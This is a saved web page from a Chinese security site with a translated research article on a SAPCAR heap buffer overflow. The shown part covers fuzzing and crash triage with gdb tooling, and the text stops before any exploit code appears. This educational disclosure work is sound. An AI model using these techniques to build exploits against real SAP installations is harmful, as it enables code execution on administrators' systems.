<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】SAPCAR堆缓冲区溢出：从crash到exploit - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="SAPCAR,缓冲区溢出,堆溢出"/>
    
        <meta name="description" content="几周之前，我们在SAPCAR中发现了简单的堆缓冲区溢出漏洞。在这篇文章中，我们将会详细讨论该漏洞的技术细节以及漏洞方法。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】SAPCAR堆缓冲区溢出：从crash到exploit</h2>
                <div class="article-msg">
                    <span class="time">2017-06-14 10:38:12</span>
                    
                                        <span class="read">阅读：21188次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3976"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3976" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://www.coresecurity.com/blog/sapcar-heap-buffer-overflow-crash-exploit"
                             target="_blank">来源： coresecurity.com</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2606963099" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01d4bd8d816ed27ddd.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2606963099" style="color:#848e99;">WisFree</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><img src="http://p1.qhimg.com/t01bbde1c7172bb5fb1.png" title="t01d1ddaed6191cbe5d.png" alt="http://p8.qhimg.com/t01d1ddaed6191cbe5d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2606963099" target="_blank" textvalue="WisFree"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">WisFree</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">预估</span><span style="font-weight: 900; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">稿费：200RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一、介绍</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">几周之前，我们在SAPCAR中发现了简单的</span><a href="https://www.coresecurity.com/advisories/sap-sapcar-heap-based-buffer-overflow-vulnerability" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">堆缓冲区溢出漏洞</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。在这篇文章中，我们将会详细讨论该漏洞的技术细节以及漏洞方法。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为此，SAP已经发布了官方安全公告#2441560，并将该问题归类为“潜在的拒绝服务（DoS）”。通过研究发现，我们不仅可以利用这个漏洞来实现代码执行，而且实现起来也相对比较容易。除此之外，我们也希望这篇文章可以让那些对代码利用感兴趣的初学者提供一个很好的参考实例。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这篇文章中，我们将了解如何通过模糊测试技术来获取到大量崩溃信息，如何找出漏洞的根本成因，以及如何确定漏洞的可利用性。接下来，我们将会使用众所周知的文件指针重写技术来设计出相应的漏洞利用代码。除此之外，本文的最后一章还会给大家介绍glibc 2.24中所采用的漏洞缓解技术细节。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们认为这是一篇极具教育意义的技术文章，因为如果我们想要对SAP系统管理员发动攻击的话，还需要一种更加可靠的漏洞利用技术。（更多细节请参考4.4章）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">二、SAPCAR</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">SAPCAR是一款针对SAR和CAR文档的命令行工具，而这两种文件格式是SAP专用的文档文件格式，SAP通常都会使用这种格式来发布软件或数据包。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本文所介绍的这个漏洞将会影响SAPCAR的v721.510版本，不过其他产品和版本仍然可能会受到影响，但我们现在只对这个特定版本进行测试。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">三、崩溃分析</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们的起始点是那导致SAPCAR代码发生崩溃的507份文件，这些文件由</span><a href="https://twitter.com/martingalloar" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">@martingalloar</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">慷慨提供，感谢Martin！这些崩溃信息是通过</span><a href="https://github.com/google/honggfuzz" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">honggfuzz</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（一款fuzzer-模糊测试工具）找到的，fuzzer对文档内容列表功能进行了测试，测试过程中需要使用到命令行参数-tvf。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Honggfuzz所创建的文件名中包含某些与崩溃相关的信息，例如程序计数器注册地址，以及终止进程的信号描述。下面给出的是一个文件示例：</span></p><pre class="brush:plain;toolbar:false">SIGSEGV.PC.7ffff6d1ef44.STACK.2d9c8e9f0.CODE.1.ADDR.0x8c4ff0.INSTR.movdqu_-0x50()%rsi),%xmm5.fuzz.verified</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在对崩溃记录进行了简单的分析之后，我们发现PC（程序计数器）值重复了很多次，这表明单独的崩溃事件数量可能比崩溃文件的数量要少，也就是相同的崩溃事件可能多次出现。单独PC地址的准确数量可以通过下列命令确定：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;ls&nbsp;|&nbsp;cut&nbsp;-d&nbsp;&#39;.&#39;&nbsp;-f&nbsp;3&nbsp;|&nbsp;uniq&nbsp;|&nbsp;wc&nbsp;-l
13</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是一个非常好的消息，因为我们只用处理13个不同的崩溃点，而不是一开始的507个。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.1 对崩溃信息进行分类</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">接下来我们要做的就是确定每一个输入文件导致代码发生崩溃的原因。对于那13个崩溃点，我们只需要在程序运行时绑定一个调试器（Debugger），然后在程序发生崩溃时检查寄存器和内存情况，而且这种方法也适用于输入文件数量较大的情况。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">幸运的是，网上有很多工具可以帮助我们完成这些工作。其中一个是一款针对gdb的名叫</span><a href="https://github.com/jfoote/exploitable" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">exploitable</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">的插件，这款插件可以根据严重性和可利用性对崩溃进行分类。为了保证分类结果的有效性，它使用了一系列启发式算法来分析被调试程序的运行状态。</span></p><p style="text-indent: 2em; text-align: left;"><a href="https://github.com/jfoote/exploitable" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">exploitable</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">插件仍然会要求我们通过gdb来运行每一个崩溃文件。为了让整个过程通过自动化的方式实现，我们还需要使用到这款名叫</span><a href="https://github.com/bnagy/crashwalk" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Crashwalk</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（由Ben Nagy开发）的实用工具。虽然它使用的是相同的gdb插件，但它可以简化整个分析过程，并允许我们以多种形式访问分析结果。安装步骤如下：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;git&nbsp;clone&nbsp;https://github.com/bnagy/crashwalk.git
$&nbsp;sudo&nbsp;apt-get&nbsp;install&nbsp;golang-go
$&nbsp;export&nbsp;GOPATH=$HOME/crashwalk/
$&nbsp;go&nbsp;get&nbsp;-u&nbsp;github.com/bnagy/crashwalk/cmd/...
$&nbsp;mkdir&nbsp;src
$&nbsp;git&nbsp;clone&nbsp;https://github.com/jfoote/exploitable.git&nbsp;src/exploitable</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">不过Crashwalk在选取文件名的时候存在一些问题，因此我们需要对崩溃文件进行快速重命名，以此来避免文件名中存在特殊字符，然后保证工具的正常运行：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;./crashwalk/bin/cwtriage&nbsp;-root&nbsp;crashes/&nbsp;-match&nbsp;lala&nbsp;--&nbsp;./sapcar_721.510_linux_x86_64&nbsp;-tvf&nbsp;@@</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">cwtriage将会输出每一个崩溃文件的分析结果，并将分析数据默认保存在crashwalk.db数据库中，我们可以使用cwdump命令来查询这个数据库。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">输出结果包括对漏洞可利用性的分类，当然了，分类的准确性还不能保证，因为这个结果只是exploitable插件使用启发式算法得出的，但我们可以根据这个结果来确定需要分析的漏洞顺序。由于我们真正感兴趣的是如何利用那些可利用的漏洞，所以我们首先要查询crashwalk数据库来获取那些可利用的漏洞：</span></p><pre class="brush:plain;toolbar:false">$&nbsp;./crashwalk/bin/cwdump&nbsp;crashwalk.db&nbsp;|&nbsp;sed&nbsp;-n&nbsp;-e&nbsp;&#39;/Classification:&nbsp;EXPLOITABLE/,/END&nbsp;SUMMARY/&nbsp;p&#39;
Classification:&nbsp;EXPLOITABLE
Hash:&nbsp;f5c06ffc7aa3f42a736f4bb7ea700ef9.5f3bf91c3626b65747adc8881231d81b
Command:&nbsp;./sapcar_721.510_linux_x86_64&nbsp;-tvf&nbsp;crashes/lala4
Faulting&nbsp;Frame:
&nbsp;&nbsp;&nbsp;None&nbsp;@&nbsp;0x000000000040c58b:&nbsp;in&nbsp;/home/ubuntu/sapcar_721.510_linux_x86_64
Disassembly:
Stack&nbsp;Head&nbsp;(7&nbsp;entries):
&nbsp;&nbsp;&nbsp;__GI__IO_unsave_markers&nbsp;&nbsp;&nbsp;@&nbsp;0x00007ffff6bc092a:&nbsp;in&nbsp;/lib/x86_64-linux-gnu/libc-2.23.so&nbsp;(BL)
&nbsp;&nbsp;&nbsp;_IO_new_file_close_it&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@&nbsp;0x00007ffff6bbd872:&nbsp;in&nbsp;/lib/x86_64-linux-gnu/libc-2.23.so&nbsp;(BL)
&nbsp;&nbsp;&nbsp;_IO_new_fclose&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@&nbsp;0x00007ffff6bb13ef:&nbsp;in&nbsp;/lib/x86_64-linux-gnu/libc-2.23.so&nbsp;(BL)
&nbsp;&nbsp;&nbsp;None&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@&nbsp;0x000000000040c58b:&nbsp;in&nbsp;/home/ubuntu/sapcar_721.510_linux_x86_64
&nbsp;&nbsp;&nbsp;None&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@&nbsp;0x000000000041958b:&nbsp;in&nbsp;/home/ubuntu/sapcar_721.510_linux_x86_64
&nbsp;&nbsp;&nbsp;None&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@&nbsp;0x000000000042bc43:&nbsp;in&nbsp;/home/ubuntu/sapcar_721.510_linux_x86_64
&nbsp;&nbsp;&nbsp;None&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@&nbsp;0x000000000043fc66:&nbsp;in&nbsp;/home/ubuntu/sapcar_721.510_linux_x86_64
Registers:
rax=0x00000000005a8594&nbsp;rbx=0x00000000005a8594&nbsp;rcx=0x00007fffffffcb00&nbsp;rdx=0x0000000000008000&nbsp;
rsi=0x00007ffff6f07b28&nbsp;rdi=0x00000000005a8594&nbsp;rbp=0x0000000000000000&nbsp;rsp=0x00007fffffffcac8&nbsp;
&nbsp;r8=0x0000000000a1c770&nbsp;&nbsp;r9=0x0000000000000000&nbsp;r10=0x0000000000000477&nbsp;r11=0x00007ffff6bb1260&nbsp;
r12=0x0000000000000000&nbsp;r13=0x00007ffff0000920&nbsp;r14=0x0000000000a3070d&nbsp;r15=0x000000000000000e&nbsp;
rip=0x00007ffff6bc092a&nbsp;efl=0x0000000000010202&nbsp;&nbsp;cs=0x0000000000000033&nbsp;&nbsp;ss=0x000000000000002b&nbsp;
&nbsp;ds=0x0000000000000000&nbsp;&nbsp;es=0x0000000000000000&nbsp;&nbsp;fs=0x0000000000000000&nbsp;&nbsp;gs=0x0000000000000000&nbsp;
Extra&nbsp;Data:
&nbsp;&nbsp;&nbsp;Description:&nbsp;Access&nbsp;violation&nbsp;on&nbsp;destination&nbsp;operand
&nbsp;&nbsp;&nbsp;Short&nbsp;description:&nbsp;DestAv&nbsp;(8/22)
&nbsp;&nbsp;&nbsp;Explanation:&nbsp;The&nbsp;target&nbsp;crashed&nbsp;on&nbsp;an&nbsp;access&nbsp;violation&nbsp;at&nbsp;an&nbsp;address&nbsp;matching&nbsp;the&nbsp;destination&nbsp;operand&nbsp;of&nbsp;the&nbsp;instruction.&nbsp;This&nbsp;likely&nbsp;indicates&nbsp;a&nbsp;write&nbsp;access&nbsp;violation,&nbsp;which&nbsp;means&nbsp;the&nbsp;attacker&nbsp;may&nbsp;control&nbsp;the&nbsp;write&nbsp;address&nbsp;and/or&nbsp;value.
---END&nbsp;SUMMARY---</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我个人非常喜欢</span><a href="https://github.com/longld/peda" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">gdb-peda</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">插件，所以我将会在接下来的测试过程中使用到它。当然了，你也可以使用例如</span><a href="https://github.com/hugsy/gef" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">gef</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">和</span><a href="https://github.com/pwndbg/pwndbg" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">pwndbg</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这样的工具，但我目前还没有尝试使用过它们。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过gdb来运行SAPCAR代码之后，我们将得到下列输出：</span></p><pre class="brush:plain;toolbar:false">[----------------------------------registers-----------------------------------]
RAX:&nbsp;0x5a8594&nbsp;(sub&nbsp;&nbsp;&nbsp;&nbsp;ecx,esi)
RBX:&nbsp;0x5a8594&nbsp;(sub&nbsp;&nbsp;&nbsp;&nbsp;ecx,esi)
RCX:&nbsp;0x7fffffffcb00&nbsp;--&gt;&nbsp;0x5a8594&nbsp;(sub&nbsp;&nbsp;&nbsp;&nbsp;ecx,esi)
RDX:&nbsp;0x8000&nbsp;
RSI:&nbsp;0x7ffff6f07b28&nbsp;--&gt;&nbsp;0xa2dc30&nbsp;--&gt;&nbsp;0x7ffff6f06260&nbsp;--&gt;&nbsp;0x0&nbsp;
RDI:&nbsp;0x5a8594&nbsp;(sub&nbsp;&nbsp;&nbsp;&nbsp;ecx,esi)
RBP:&nbsp;0x0&nbsp;
RSP:&nbsp;0x7fffffffcaf8&nbsp;--&gt;&nbsp;0x7ffff6bbd872&nbsp;(&lt;_IO_new_file_close_it+50&gt;:&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;BYTE&nbsp;PTR&nbsp;[rbx+0x74],0x20)
RIP:&nbsp;0x7ffff6bc092a&nbsp;(&lt;__GI__IO_unsave_markers+10&gt;:&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rdi+0x60],0x0)
R8&nbsp;:&nbsp;0xa2dc40&nbsp;--&gt;&nbsp;0xa304e0&nbsp;--&gt;&nbsp;0x0&nbsp;
R9&nbsp;:&nbsp;0x0&nbsp;
R10:&nbsp;0x477&nbsp;
R11:&nbsp;0x7ffff6bb1260&nbsp;(&lt;_IO_new_fclose&gt;:&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;r12)
R12:&nbsp;0x0&nbsp;
R13:&nbsp;0x7ffff0000920&nbsp;--&gt;&nbsp;0x474e5543432b2b00&nbsp;(&#39;&#39;)
R14:&nbsp;0xa3056d&nbsp;--&gt;&nbsp;0x20000000&nbsp;(&#39;&#39;)
R15:&nbsp;0xe
EFLAGS:&nbsp;0x10202&nbsp;(carry&nbsp;parity&nbsp;adjust&nbsp;zero&nbsp;sign&nbsp;trap&nbsp;INTERRUPT&nbsp;direction&nbsp;overflow)
[-------------------------------------code-------------------------------------]
&nbsp;&nbsp;&nbsp;0x7ffff6bc0920&nbsp;&lt;__GI__IO_unsave_markers&gt;:&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;QWORD&nbsp;PTR&nbsp;[rdi+0x60],0x0
